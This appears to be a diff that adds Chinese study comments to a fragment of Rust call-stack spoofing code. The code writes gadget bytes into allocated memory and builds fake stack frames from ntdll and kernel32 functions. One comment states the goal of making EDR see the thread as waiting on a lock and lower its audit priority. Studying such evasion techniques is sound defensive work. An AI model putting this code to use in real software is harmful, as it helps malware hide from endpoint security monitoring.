@@ -106,7 +106,10 @@ impl StackSpoof {
         // Allocate gadget code
         let bytes = kind.bytes();
         let mut gadget_code = null_mut();
+        // 1左移12位后,该值对应的十进制是4096
         let mut code_size = 1 << 12;
+
+        // 
         if !NT_SUCCESS(NtAllocateVirtualMemory(
             NtCurrentProcess(), 
             &mut gadget_code, 
@@ -118,6 +121,7 @@ impl StackSpoof {
             bail!(s!("failed to allocate memory for gadget code"));
         }
 
+        // 将对应的机器码写入gadget_code(第一块申请的内存)
         unsafe {
             core::ptr::copy_nonoverlapping(bytes.as_ptr(), gadget_code as *mut u8, bytes.len());
         }
@@ -150,6 +154,7 @@ impl StackSpoof {
 
         unsafe {
             // Writes the gadget address (`mov rsp, rbp; ret`) to a pointer page
+            // 将第一块内存的位置写入第二块内存中
             *(gadget_ptr as *mut u64) = gadget_code as u64;
 
             // Locks the specified region of virtual memory into physical memory,
@@ -167,21 +172,30 @@ impl StackSpoof {
 
     /// Resolves stack frame sizes for known Windows thread routines using unwind metadata.
     pub fn frames(&mut self, cfg: &Config) -> Result<()> {
+
+        // 调用cfg.modules(config.rs中调用了get_ntdll_address)得到一个Modules结构体
         let pe_ntdll = Unwind::new(PE::parse(cfg.modules.ntdll.as_ptr()));
         let pe_kernel32 = Unwind::new(PE::parse(cfg.modules.kernel32.as_ptr()));
 
+        // 通过get_proc_address找到RtlUserThreadStart的va.-ntdll基址得到rva.
+        // 通过rva在异常目录中(Image_RunTime_Function数组)匹配对应的记录
+        // 是伪造栈的最底层
         let rtl_user = pe_ntdll
             .function_by_offset(cfg.rtl_user_thread.as_u64() as u32 - cfg.modules.ntdll.as_u64() as u32)
             .context(s!("missing unwind: RtlUserThreadStart"))?;
 
+        // 是RtlUserThreadStart调用的第一个函数BaseThreadInitThunk,确保伪造栈的底部两层的真实
         let base_thread = pe_kernel32
             .function_by_offset(cfg.base_thread.as_u64() as u32 - cfg.modules.kernel32.as_u64() as u32)
             .context(s!("missing unwind: BaseThreadInitThunk"))?;
 
+        // kernel32!EnumDateFormatsExA,原型为枚举当前os支持的所有日期格式.
+        // 支持回调,它会遍历内部和数据,每找到一种格式,都会调用一次用户提供的回调函数
         let enum_date = pe_kernel32
             .function_by_offset(cfg.enum_date.as_u64() as u32 - cfg.modules.kernel32.as_u64() as u32)
             .context(s!("missing unwind: EnumDateFormatsExA"))?;
 
+        // RtlAcquireSRWLockExclusive,极为常见的内核同步锁函数.模拟一个看起来很忙又很正常的函数.让edr认为线程在等待资源,降低审计优先级
         let rtl_acquire_srw = pe_ntdll
             .function_by_offset(cfg.rtl_acquire_lock.as_u64() as u32 - cfg.modules.ntdll.as_u64() as u32)
             .context(s!("missing unwind: RtlAcquireSRWLockExclusive"))?;
